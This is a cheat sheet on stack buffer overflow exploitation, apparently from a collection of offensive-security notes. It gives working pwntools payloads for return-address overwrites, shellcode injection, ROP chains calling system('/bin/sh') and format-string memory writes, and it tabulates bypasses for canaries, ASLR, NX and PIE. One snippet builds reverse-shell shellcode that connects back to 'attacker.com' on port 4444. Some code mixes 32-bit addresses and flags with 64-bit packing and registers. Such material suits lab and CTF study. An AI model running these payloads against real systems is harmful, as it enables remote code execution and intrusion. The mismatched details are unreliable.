# Stack Buffer Overflow

## Prerequisites

- Assembly knowledge (x86/x64)
- GDB debugger
- pwntools (Python)
- Vulnerable binary (no ASLR, NX disabled, or with gadgets for ROP)

## Basic Methodology

### 1. Identify Vulnerability

```bash
# Compile with protections disabled
gcc -m32 -fno-stack-protector -z execstack vulnerable.c -o vulnerable

# Test for overflow
python3 -c "print('A' * 100)" | ./vulnerable
# Segmentation fault = likely vulnerable
```

### 2. Crash the Program & Find Offset

```bash
# Generate pattern
pattern_create.rb -l 200 > pattern.txt
python3 -c "print(open('pattern.txt').read())" | ./vulnerable

# Get EIP value from crash (e.g., 0x41346241)
# Find offset
pattern_offset.rb -q 0x41346241
# Output: Exact match at offset 112
```

### 3. Overwrite Return Address

```python
from pwn import *

# Identify target address (e.g., shellcode address)
target_addr = 0x08048000  # Beginning of text segment or buffer address

# Build payload
offset = 112
payload = b'A' * offset
payload += p32(target_addr)  # Overwrite EIP with target

# Send to vulnerable binary
p = process('./vulnerable')
p.sendline(payload)
p.interactive()
```

### 4. Place Shellcode

**In buffer (if executable):**

```python
offset = 112
shellcode = asm(shellcraft.sh())  # pwntools shellcraft
padding = offset - len(shellcode)

payload = shellcode
payload += b'B' * padding
payload += p32(buffer_address)  # Jump to shellcode
```

**Via environment variable:**

```bash
export SHELLCODE=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 100 + b'shellcode_here')")
# Adjust address dynamically
```

### 5. Gadget-Based Exploitation (ROP)

If DEP/NX is enabled, chain RET gadgets:

```python
from pwn import *

# Find gadgets
# ropper --file vulnerable --search "pop rdi"
# objdump -d vulnerable | grep "pop rdi"

# Common gadgets
pop_rdi = 0x0804a123  # pop rdi; ret
pop_rsi = 0x0804a124  # pop rsi; ret
pop_rdx = 0x0804a125  # pop rdx; ret
syscall = 0x0804a500  # syscall; ret

# Build ROP chain (call system("/bin/sh"))
offset = 112
rop_chain = b'A' * offset
rop_chain += p64(pop_rdi)           # Set RDI = pointer to "/bin/sh"
rop_chain += p64(bin_sh_addr)       # Address of "/bin/sh" string
rop_chain += p64(system_plt)        # Call system()

p = process('./vulnerable')
p.sendline(rop_chain)
p.interactive()
```

## Debugging with GDB

```bash
# Run with GDB
gdb ./vulnerable

# Set breakpoint at main
(gdb) break main
(gdb) run

# Step through
(gdb) nexti        # Next instruction
(gdb) stepi        # Step into
(gdb) continue     # Continue

# Examine memory
(gdb) x/20x $esp   # Examine stack
(gdb) x/i $eip     # Examine instruction at EIP

# View registers
(gdb) info registers
(gdb) print $rax

# Set breakpoint on functions
(gdb) break vulnerable_function
(gdb) run $(python3 -c "print('A' * 200)")
```

## Format String Vulnerabilities

Often used to read/write memory before buffer overflow:

```bash
# Vulnerable code: printf(user_input)
python3 -c "print('%x.' * 20)" | ./vulnerable
# Leaks stack values (format string arbitrary read/write)
```

**Writing to memory:**

```python
# %n writes to address
# %x leaks stack

offset = 6  # Position of our controlled data on stack

payload = b'AAAA'           # Address to write to (0x41414141)
payload += b'%60x%' + str(offset).encode() + b'$n'
# Writes 60 bytes to address 0x41414141

# To write specific value:
# %[value]x%[offset]$n writes [value] bytes
```

## Common Shellcode (pwntools)

```python
from pwn import *

# x86 Linux
shellcode_x86 = asm(shellcraft.i386.linux.sh())

# x64 Linux
shellcode_x64 = asm(shellcraft.amd64.linux.sh())

# Reverse shell (connect back)
shellcode_rev = asm(shellcraft.amd64.linux.connect('attacker.com', 4444, sock='rax'))
shellcode_rev += asm(shellcraft.amd64.linux.dup2('rax', 0))
shellcode_rev += asm(shellcraft.amd64.linux.dup2('rax', 1))
shellcode_rev += asm(shellcraft.amd64.linux.sh())
```

## Bypasses

| Protection | Bypass |
|---|---|
| **Stack Canary** | Leak canary value first (via format string or infoleak) |
| **ASLR** | Leak addresses (PIE), use ROP chains, or disable for testing |
| **DEP/NX** | ROP gadgets, ret2libc (call library functions) |
| **PIE** | Information leak (infoleak) to get base address |

## Exploitation with pwntools

```python
#!/usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64')

# Connect to target
p = remote('localhost', 1234)  # Or process('./binary')

# Build payload
offset = 112
shellcode = asm(shellcraft.sh())

payload = shellcode
payload += b'B' * (offset - len(shellcode))
payload += p64(buffer_addr)

# Send and interact
p.sendline(payload)
p.interactive()
```

---

<div align="center">

*Part of the [D4RKGUNN3R Cheatsheets](./README-CHEATSHEETS.md) collection.*

</div>
